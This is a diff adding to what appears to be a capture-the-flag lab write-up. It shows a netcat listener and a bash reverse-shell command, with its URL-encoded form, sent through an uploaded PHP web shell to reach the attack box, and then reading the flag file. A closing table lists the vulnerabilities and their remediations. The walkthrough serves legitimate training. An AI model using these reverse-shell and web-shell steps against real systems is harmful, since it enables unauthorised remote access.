@@ -175,3 +175,45 @@ After uploading the file we can check by executing different commands in the `cm
 curl "http://10.64.146.243/uploads/documents/shell.phtml?cmd=whoami"
 ```
 
+now we are going to get the active shell using `netcat` in action.
+
+On our local machine which is the attack box, run the `netcat` listener:
+
+```
+nc -lvnp 4444
+```
+
+This will be the command we will be embedding in the URL as encoded:
+
+```
+bash -c 'bash -i >& /dev/tcp/10.64.81.180/4444 0>&1'
+```
+
+encoded:
+
+```
+bash+-c+'bash+-i+>%26+/dev/tcp/10.64.81.180/4444+0>%261'
+```
+
+**GOT THE SHELLL!**
+
+![[Pasted image 20260708203245.png]]
+
+
+Reading the flag:
+
+```
+cat /var/www/flag.txt
+```
+
+![[Pasted image 20260708203416.png]]
+
+### Summary
+
+| Vulnerability                                | Severity | Remediation                                                                                                                                                                                     |
+| -------------------------------------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| IDOR on user profiles and API                | High     | Implement server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requested resource.                                                |
+| Password reset token exposed in the response | Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters.                                |
+| Incomplete file extension blocklist          | Critical | Use an allowlist rather than a blocklist. Only permit specific, expected extensions. Validate file content (MIME type) in addition to the extension. Store uploaded files outside the web root. |
+| API endpoint disclosure                      | Medium   | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users.                                                 |
+
